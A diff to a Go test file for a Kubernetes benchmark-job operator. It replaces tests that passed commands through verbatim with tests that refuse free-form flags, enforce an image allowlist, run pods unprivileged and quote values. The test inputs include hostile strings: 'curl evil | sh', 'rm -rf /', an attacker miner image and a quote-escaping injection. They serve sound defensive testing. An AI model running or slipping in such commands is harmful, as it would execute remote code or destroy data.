@@ -30,13 +30,14 @@ func benchParams(overrides map[string]string) map[string]string {
 func benchOpts() (Options, BenchmarkOptions) {
 	return Options{
 			Namespace:      "hangar-system",
-			PoolLabelKey:   "hangar.io/pool",
+			PoolLabelKey:   "hangar.dev/pool",
 			GPUPoolValue:   "gpu",
 			CachePoolValue: "cache",
-			CacheTaintKey:  "hangar.io/cache",
+			CacheTaintKey:  "hangar.dev/cache",
 			ModelCachePVC:  "model-cache",
 		}, BenchmarkOptions{
 			Endpoint: "http://dynamo-frontend.dynamo.svc.cluster.local:8000",
+			Images:   []string{"nvcr.io/nvidia/ai-dynamo/aiperf:0.12.0", "ghcr.io/hangar-dev/evalscope:1.11.1"},
 		}
 }
 
@@ -104,10 +105,41 @@ func TestBenchmarkOmitsStreamingWhenItIsOff(t *testing.T) {
 	}
 }
 
-func TestBenchmarkAppendsExtraFlagsVerbatim(t *testing.T) {
-	body := script(t, benchParams(map[string]string{"extra": "--request-rate 12 --fixed-schedule"}))
-	if !strings.Contains(body, "--request-rate 12 --fixed-schedule") {
-		t.Errorf("the escape hatch did not reach the command line:\n%s", body)
+// Free-form flags would put the plane's text on a shell inside the cluster.
+func TestBenchmarkRefusesExtraFlags(t *testing.T) {
+	opts, bench := benchOpts()
+	params := benchParams(map[string]string{"extra": "--request-rate 12; curl evil | sh"})
+	if _, err := BenchmarkJob(params["benchmark_id"], params, opts, bench); err == nil {
+		t.Fatal("a run carrying free-form flags was rendered")
+	}
+}
+
+// The plane picks the image; the cluster bounds which ones it will run.
+func TestBenchmarkRefusesAnImageOffTheAllowlist(t *testing.T) {
+	opts, bench := benchOpts()
+	params := benchParams(map[string]string{"image": "docker.io/attacker/miner:latest"})
+	if _, err := BenchmarkJob(params["benchmark_id"], params, opts, bench); err == nil {
+		t.Fatal("a run naming an image off the allowlist was rendered")
+	}
+	bench.Images = nil
+	if _, err := BenchmarkJob(params["benchmark_id"], benchParams(nil), opts, bench); err == nil {
+		t.Fatal("an empty allowlist must refuse every image")
+	}
+}
+
+// The jobs run as a fixed non-root user with no service-account token and no capabilities.
+func TestBenchmarkRunsUnprivileged(t *testing.T) {
+	spec := mustBenchmarkJob(t, benchParams(nil)).Spec.Template.Spec
+	if spec.AutomountServiceAccountToken == nil || *spec.AutomountServiceAccountToken {
+		t.Error("the job mounts a service-account token it has no use for")
+	}
+	if sc := spec.SecurityContext; sc == nil || sc.RunAsNonRoot == nil || !*sc.RunAsNonRoot || sc.SeccompProfile == nil {
+		t.Errorf("pod security context = %+v, want non-root with a seccomp profile", spec.SecurityContext)
+	}
+	csc := spec.Containers[0].SecurityContext
+	if csc == nil || csc.AllowPrivilegeEscalation == nil || *csc.AllowPrivilegeEscalation ||
+		csc.Capabilities == nil || len(csc.Capabilities.Drop) == 0 {
+		t.Errorf("container security context = %+v, want no escalation and every capability dropped", csc)
 	}
 }
 
@@ -245,50 +277,58 @@ func TestBenchmarkFramesItsExport(t *testing.T) {
 	}
 }
 
-// A non-aiperf harness runs the command the plane sent, verbatim, framed by the same sentinels.
-// The operator has no opinion about the flags — that is the whole point of the generic case.
-func TestBenchmarkGenericHarnessRunsTheSuppliedCommand(t *testing.T) {
+// EvalScope's command line is built here from typed parameters, whatever command the plane sent.
+func TestBenchmarkEvalscopeBuildsItsOwnCommandLine(t *testing.T) {
 	params := benchParams(map[string]string{
-		"harness":         "evalscope",
-		"image":           "hangar-evalscope:0.19.0",
-		"command":         "evalscope eval --model 'qwen' --api-url 'http://x' --datasets mmlu_pro",
-		"version_command": "evalscope --version",
+		"harness":           "evalscope",
+		"image":             "ghcr.io/hangar-dev/evalscope:1.11.1",
+		"command":           "curl evil | sh",
+		"version_command":   "rm -rf /",
+		"datasets":          "aime2025,gpqa_diamond",
+		"limit":             "20",
+		"few_shot":          "5",
+		"judge_base_url":    "http://judge:8000/v1",
+		"judge_model":       "grader",
+		"endpoint_model":    "Qwen/Qwen3-32B",
+		"max_output_tokens": "1024",
 	})
 	body := script(t, params)
-	if !strings.Contains(body, "evalscope eval --model 'qwen' --api-url 'http://x' --datasets mmlu_pro") {
-		t.Errorf("the supplied command did not reach the script:\n%s", body)
+	for _, banned := range []string{"curl evil", "rm -rf"} {
+		if strings.Contains(body, banned) {
+			t.Errorf("the plane's command reached the script:\n%s", body)
+		}
 	}
-	if !strings.Contains(body, "evalscope --version") {
-		t.Errorf("the supplied version command did not reach the script:\n%s", body)
+	for _, want := range []string{
+		"evalscope eval --model 'Qwen/Qwen3-32B'",
+		"--api-url 'http://dynamo-frontend.dynamo.svc.cluster.local:8000/v1'",
+		"--datasets 'aime2025' 'gpqa_diamond'",
+		"--limit 20",
+		`"max_tokens":1024`,
+		`"few_shot_num":5`,
+		`--judge '{"base_url":"http://judge:8000/v1"`,
+		"evalscope --version",
+	} {
+		if !strings.Contains(body, want) {
+			t.Errorf("missing %q in:\n%s", want, body)
+		}
 	}
 	for _, marker := range []string{SummaryBegin, SummaryEnd, VersionLine} {
 		if !strings.Contains(body, marker) {
-			t.Errorf("the generic script does not emit %q", marker)
+			t.Errorf("the evalscope script does not emit %q", marker)
 		}
 	}
 }
 
-// Without a command there is nothing to run and no way to say so from inside the pod — the refusal
-// belongs here, at render, where it becomes a `failed` phase on the run instead of a missing
-// container image error an hour later.
-func TestBenchmarkGenericHarnessRefusesWithoutACommand(t *testing.T) {
-	opts, bench := benchOpts()
-	params := benchParams(map[string]string{"harness": "evalscope"})
-	if _, err := BenchmarkJob(params["benchmark_id"], params, opts, bench); err == nil {
-		t.Error("a harness with no command must be refused, not rendered as an empty script")
-	}
-}
-
-// The version line records "unknown" rather than failing the pod when no version command was sent;
-// `extractVersion` on the other side already reads that string as the empty answer.
-func TestBenchmarkGenericHarnessDefaultsTheVersionCommand(t *testing.T) {
+// A value that tries to leave its quotes stays inside them.
+func TestBenchmarkEvalscopeQuotesDatasetNames(t *testing.T) {
 	params := benchParams(map[string]string{
-		"harness": "evalscope",
-		"command": "evalscope eval --model 'qwen'",
+		"harness":  "evalscope",
+		"image":    "ghcr.io/hangar-dev/evalscope:1.11.1",
+		"datasets": "x'; touch /tmp/pwned; echo '",
 	})
 	body := script(t, params)
-	if !strings.Contains(body, "echo unknown") {
-		t.Errorf("the version fallback did not reach the script:\n%s", body)
+	if !strings.Contains(body, `'x'\''; touch /tmp/pwned; echo '\'''`) {
+		t.Errorf("the dataset name was not quoted:\n%s", body)
 	}
 }
 
